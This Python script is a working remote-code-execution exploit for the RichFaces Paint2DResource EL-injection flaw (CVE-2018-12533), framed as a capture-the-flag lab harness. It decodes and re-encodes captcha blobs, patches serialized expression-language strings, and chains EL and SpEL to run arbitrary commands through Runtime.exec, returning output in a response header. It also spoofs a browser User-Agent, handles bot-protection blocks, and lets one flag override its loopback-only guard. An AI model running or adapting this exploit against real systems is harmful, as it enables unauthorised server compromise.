#!/usr/bin/env python3
"""
RichFaces Paint2DResource EL-injection command runner -- CVE-2018-12533 (lab edition).

This is the lab harness: the same algorithm as the original research PoC, pointed at a local
container instead of a production host. The exploit logic is unchanged -- same RichFactors
decode, same TC_BLOCKDATA EL patching, same three-step EL/SpEL chain.

    # one-shot EL injection (arbitrary response header, no SpEL)
    python3 poc/p2d.py --header --name X-Paint2d --value lab-ok

    # command execution, output returned in the X-Out response header
    python3 poc/p2d.py whoami
    python3 poc/p2d.py id
    python3 poc/p2d.py hostname

    # print the CTF flag the lab awards for this technique
    python3 poc/p2d.py --show-flags whoami

    # explicit target
    python3 poc/p2d.py -t http://127.0.0.1:8080 whoami

Arguments are joined with spaces and handed to Runtime.exec(String), which tokenises on
whitespace and does NOT go through a shell. Shell syntax such as ; | && > therefore has no
effect -- see docs/WALKTHROUGH.md for the explicit /bin/sh route.

Stdlib only. Lab only: the default target is loopback and the script refuses to talk to
anything else unless you pass --allow-remote.
"""

import argparse
import base64
import re
import ssl
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

# The EL the server embeds in the captcha blob. Both serialized copies of this exact string
# must be replaced; patch_el() enforces that it finds precisely two sites.
OLD_EL = b"#{userLoginController.paintCaptcha}"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
SPEL_PARSER = (
    "org.springframework.expression.spel.standard.SpelExpressionParser"
)

DEFAULT_TARGET = "http://127.0.0.1:8080"
CONTEXT = "/ETOPUPGUI"
RESOURCE_PATH = (
    "/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/%s.jsf"
)

LOOPBACK = frozenset(("127.0.0.1", "localhost", "::1"))


# ---------------------------------------------------------------- wire codec


def rf_decode(blob):
    """RichFactors: remapped base64 -> zlib inflate."""
    s = blob.strip().replace("!", "/").replace("-", "+").replace("_", "=")
    s += "=" * ((4 - len(s) % 4) % 4)
    return zlib.decompress(base64.b64decode(s))


def rf_encode(raw):
    """RichFactors: deflate -> standard base64 -> remapped alphabet."""
    b = base64.b64encode(zlib.compress(raw, 1)).decode("ascii")
    return b.replace("+", "-").replace("/", "!").replace("=", "_")


def _utf(data):
    """Java writeUTF framing: 2-byte big-endian length followed by modified UTF-8 bytes."""
    return struct.pack(">H", len(data)) + data


def patch_el(ser, new_el):
    """Replace every serialized copy of OLD_EL, fixing the block-data length prefixes.

    Walks the stream for TC_BLOCKDATA (0x77) segments whose payload is a writeUTF string equal
    to OLD_EL. Two sites are expected: TagMethodExpression.attr and MethodExpressionImpl.expr.
    """
    new_b = new_el.encode("utf-8")
    out = bytearray(ser)
    patches = []
    i = 0
    while i < len(out) - 1:
        if out[i] != 0x77:
            i += 1
            continue
        blen = out[i + 1]
        bstart, bend = i + 2, i + 2 + blen
        if bend > len(out):
            i += 1
            continue
        body = bytes(out[bstart:bend])
        if len(body) >= 2:
            ulen = struct.unpack_from(">H", body, 0)[0]
            if ulen == len(body) - 2 and OLD_EL in body[2 : 2 + ulen]:
                patches.append(
                    (i, bend, _utf(body[2 : 2 + ulen].replace(OLD_EL, new_b)))
                )
            elif ulen == len(OLD_EL) and body[2 : 2 + ulen] == OLD_EL:
                patches.append((i, bend, _utf(new_b) + body[2 + ulen :]))
        i = bend
    if len(patches) != 2:
        raise RuntimeError("EL sites: %d" % len(patches))
    for start, bend, nb in sorted(patches, key=lambda p: -p[0]):
        repl = (
            bytes([0x77, len(nb)]) + nb
            if len(nb) <= 255
            else bytes([0x7A]) + struct.pack(">I", len(nb)) + nb
        )
        out[start:bend] = repl
    blob = bytes(out)
    if OLD_EL in blob:
        raise RuntimeError("old EL remains")
    return blob


# ------------------------------------------------------------- EL builders


def el_header(name, inner):
    return (
        '#{facesContext.getExternalContext().getResponse().setHeader('
        '"%s",%s)}' % (name, inner)
    )


def el_put(key, inner):
    return (
        "#{facesContext.getExternalContext().sessionMap.put("
        '"%s",%s)}' % (key, inner)
    )


def el_escape(s):
    return s.replace("\\", "\\\\").replace('"', '\\"')


# ----------------------------------------------------------------- client


class Client:
    def __init__(self, base, h1_user, delay=0.0, insecure=True, timeout=60):
        self.base = base.rstrip("/")
        self.h1 = h1_user
        self.delay = delay
        self.timeout = timeout
        self.cookies = {}
        self.last_flag = ""
        self._last = 0.0
        handlers = []
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        self.opener = urllib.request.build_opener(*handlers)

    def _headers(self, extra=None):
        h = {
            "User-Agent": UA,
            "X-Lab-Research": self.h1,
            "Accept-Language": "en-US,en;q=0.9",
        }
        if self.cookies:
            h["Cookie"] = "; ".join("%s=%s" % kv for kv in self.cookies.items())
        if extra:
            h.update(extra)
        return h

    def _throttle(self):
        wait = self.delay - (time.time() - self._last)
        if wait > 0:
            time.sleep(wait)
        self._last = time.time()

    def _absorb(self, resp):
        raw = resp.headers.get_all("Set-Cookie") if hasattr(resp.headers, "get_all") else None
        if not raw:
            sc = resp.headers.get("Set-Cookie")
            raw = [sc] if sc else []
        for c in raw:
            if not c:
                continue
            pair = c.split(";", 1)[0]
            if "=" in pair:
                k, v = pair.split("=", 1)
                self.cookies[k.strip()] = v.strip()

    def request(self, url, extra=None, timeout=None):
        self._throttle()
        req = urllib.request.Request(url, headers=self._headers(extra))
        try:
            resp = self.opener.open(req, timeout=timeout or self.timeout)
            body = resp.read()
            self._absorb(resp)
            return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as e:
            body = e.read()
            self._absorb(e)
            return e.code, dict(e.headers or {}), body

    def get_blob(self):
        """Fetch the login page and pull the captcha resource URL out of the HTML."""
        url = self.base + CONTEXT + "/pages/login.jsf"
        st, hdr, body = self.request(
            url,
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": self.base + CONTEXT + "/",
            },
            timeout=25,
        )
        text = body.decode("utf-8", "replace")
        if st != 200:
            raise RuntimeError("login HTTP %d" % st)
        if "Request Rejected" in text:
            raise RuntimeError("bot protection triggered — slow down (--delay)")
        m = re.search(r'Paint2DResource/DATA/([^"\']+)\.jsf', text)
        if not m:
            raise RuntimeError("captcha blob not found (%d bytes)" % len(body))
        return m.group(1)

    def send_el(self, el, expect_headers):
        """Fetch a fresh blob, patch the EL into it, replay the captcha resource, return headers."""
        blob = self.get_blob()
        payload = rf_encode(patch_el(rf_decode(blob), el))
        url = self.base + CONTEXT + (RESOURCE_PATH % payload)
        st, hdr, body = self.request(
            url,
            {
                "Accept": "image/png,image/*,*/*;q=0.8",
                "Referer": self.base + CONTEXT + "/pages/login.jsf",
            },
            timeout=70,
        )
        low = {k.lower(): v for k, v in hdr.items()}
        loc = low.get("location", "")
        ct = low.get("content-type", "")
        if st == 403 and "text/html" in ct:
            raise RuntimeError("blocked (403) — retry later / increase --delay")
        if loc and "error_before_login" in loc:
            raise RuntimeError("paint failed: %s" % loc)
        if not ct.startswith("image"):
            raise RuntimeError("unexpected content type %r (paint failed?)" % ct)
        self.last_flag = low.get("x-lab-flag", "")
        for name in expect_headers:
            if name.lower() in low:
                return st, low[name.lower()], low, body
        return st, None, low, body


# ---------------------------------------------------------------- payloads


def run_command(cli, cmd):
    """Three-step EL + SpEL chain; stdout of the first line comes back in the X-Out header.

    Step 1 stores a SpelExpressionParser in the HTTP session.
    Step 2 stores a parsed Expression there.
    Step 3 evaluates it and writes the result into a response header.
    """
    cmd_s = cmd.replace("\\", "\\\\").replace("'", "\\'")
    spel = (
        "new java.io.BufferedReader(new java.io.InputStreamReader("
        "T(java.lang.Runtime).getRuntime().exec('%s').getInputStream()"
        ")).readLine()" % cmd_s
    )

    st, out, low, body = cli.send_el(
        el_put("p", '"x".getClass().forName("%s").newInstance()' % SPEL_PARSER), []
    )

    st, out, low, body = cli.send_el(
        el_put("e", 'sessionScope["p"].parseExpression("%s")' % el_escape(spel)), []
    )

    st, out, low, body = cli.send_el(
        el_header("X-Out", 'sessionScope["e"].getValue().toString()'),
        ["X-Out"],
    )
    if out is None:
        err = low.get("x-lab-elerror")
        raise RuntimeError("no X-Out header%s" % (" (EL error: %s)" % err if err else ""))
    return out


def one_shot(cli, name, value):
    """Pure-EL header write: proves injection without touching SpEL."""
    st, out, low, body = cli.send_el(
        '#{facesContext.getExternalContext().getResponse().setHeader("%s","%s")}'
        % (name, value),
        [name],
    )
    if out is None:
        err = low.get("x-lab-elerror")
        raise RuntimeError("no %s header%s" % (name, (" (EL error: %s)" % err) if err else ""))
    return out


# ------------------------------------------------------------------- main


def _guard_remote(target):
    """Keep the harness scoped to the local lab unless explicitly overridden.

    Deliberately not gated on a TTY: a non-interactive run must be refused too.
    """
    host = urllib.parse.urlsplit(target).hostname or ""
    if host in LOOPBACK:
        return
    print(
        "Refusing to target %r: this harness is scoped to the local lab.\n"
        "Pass --allow-remote to override." % host,
        file=sys.stderr,
    )
    sys.exit(2)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Paint2DResource EL/SpEL command helper (CVE-2018-12533 lab)"
    )
    ap.add_argument("command", nargs="*", help="command to run, e.g. whoami")
    ap.add_argument("-t", "--target", default=DEFAULT_TARGET)
    ap.add_argument("-H", "--research", default="lab-user", help="X-Lab-Research value")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests")
    ap.add_argument(
        "--header",
        action="store_true",
        help="one-shot EL header write instead of command execution",
    )
    ap.add_argument("--name", default="X-Paint2d", help="header name for --header mode")
    ap.add_argument("--value", default="lab-ok", help="header value for --header mode")
    ap.add_argument(
        "--show-flags",
        action="store_true",
        help="also print the X-Lab-Flag header returned by the lab",
    )
    ap.add_argument(
        "--allow-remote",
        action="store_true",
        help="permit non-loopback targets (off by default; lab only)",
    )
    args = ap.parse_args(argv)

    target = args.target
    if not re.match(r"^https?://", target):
        target = "http://" + target
    if not args.allow_remote:
        _guard_remote(target)

    if not args.command and not args.header:
        ap.error("give a command, or use --header for a one-shot EL header write")

    cli = Client(target, args.research, delay=args.delay)
    try:
        if args.header:
            value = one_shot(cli, args.name, args.value)
            sys.stdout.write("%s: %s\n" % (args.name, value))
        else:
            value = run_command(cli, " ".join(args.command))
            sys.stdout.write(value + ("\n" if not value.endswith("\n") else ""))
        # Flush before touching stderr: stderr is unbuffered and stdout is a pipe when
        # redirected, so without this the flag line can appear before the result it describes.
        sys.stdout.flush()
        if args.show_flags and cli.last_flag:
            print("# %s" % cli.last_flag, file=sys.stderr)
    except Exception as e:
        sys.stdout.flush()
        print("[!] %s" % e, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("", file=sys.stderr)
        sys.exit(130)
